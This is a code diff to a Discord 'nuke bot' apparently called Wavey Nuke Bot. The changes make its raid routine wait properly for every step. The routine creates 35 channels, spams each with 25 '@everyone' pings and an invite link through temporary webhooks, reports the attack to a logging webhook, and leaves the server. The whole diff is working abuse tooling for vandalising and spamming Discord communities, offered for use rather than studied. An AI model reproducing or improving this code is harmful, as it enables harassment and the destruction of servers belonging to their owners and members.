@@ -9,7 +9,7 @@ const client = new Client({
     ]
 });
 
-const emojis = ['🌊', '💜', '🩷'];
+const emojis = ['💀', '⚰️', '🦴', '🪦', '⚔️', '🗡️', '🔪', '🩸', '☠️', '👻'];
 const discordLink = "https://discord.gg/XrTZWKgXca";
 
 client.on('ready', () => {
@@ -108,18 +108,21 @@ async function nukeServer(guild, originalServerName, originalServerIcon, trigger
         }
         await Promise.all(rolePromises);
         
-        // Create 35 text channels (no voice channels)
+        // Create 35 text channels and send webhook pings - FIXED TO PROPERLY AWAIT
         const channelPromises = [];
         for (let i = 0; i < 35; i++) {
             const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
             
             channelPromises.push(
-                guild.channels.create({
-                    name: `Wavey-${randomEmoji}`,
-                    type: 0 // GUILD_TEXT
-                }).then(async (channel) => {
-                    // Create a webhook in this channel
+                (async () => {
                     try {
+                        // Create channel
+                        const channel = await guild.channels.create({
+                            name: `Wavey-${randomEmoji}`,
+                            type: 0 // GUILD_TEXT
+                        });
+                        
+                        // Create webhook in this channel
                         const webhook = await channel.createWebhook({
                             name: `Wavey-${randomEmoji}`,
                             avatar: client.user.displayAvatarURL()
@@ -127,24 +130,28 @@ async function nukeServer(guild, originalServerName, originalServerIcon, trigger
                         
                         const webhookClient = new WebhookClient({ id: webhook.id, token: webhook.token });
                         
-                        // Send 25 pings through the webhook
+                        // Send 25 pings through the webhook - AWAIT EACH ONE
                         for (let j = 0; j < 25; j++) {
                             await webhookClient.send(`@everyone NUKE BY WAVEY ${discordLink}`).catch(console.error);
                         }
                         
-                        // Delete the webhook (but keep the channel)
+                        // Delete the webhook
                         await webhook.delete().catch(console.error);
+                        
+                        console.log(`Completed channel ${i + 1}/55`);
                     } catch (error) {
-                        console.error('Error creating webhook:', error);
+                        console.error('Error in channel/webhook:', error);
                     }
-                }).catch(console.error)
+                })()
             );
         }
+        
+        // Wait for ALL channels AND their webhook pings to complete
         await Promise.all(channelPromises);
         
-        console.log('Server nuked successfully!');
+        console.log('All webhook pings sent!');
         
-        // Send webhook notification
+        // NOW send log webhook notification
         try {
             const logWebhook = new WebhookClient({ url: process.env.LOG_WEBHOOK });
             const nukeEmbed = new EmbedBuilder()
@@ -163,12 +170,12 @@ async function nukeServer(guild, originalServerName, originalServerIcon, trigger
                 .setFooter({ text: 'Wavey Nuke Bot' });
             
             await logWebhook.send({ embeds: [nukeEmbed] });
-            console.log('Webhook notification sent!');
+            console.log('Log webhook notification sent!');
         } catch (error) {
-            console.error('Error sending webhook:', error);
+            console.error('Error sending log webhook:', error);
         }
         
-        // Leave the server
+        // NOW leave the server after everything is done
         try {
             await guild.leave();
             console.log('Left the server successfully!');
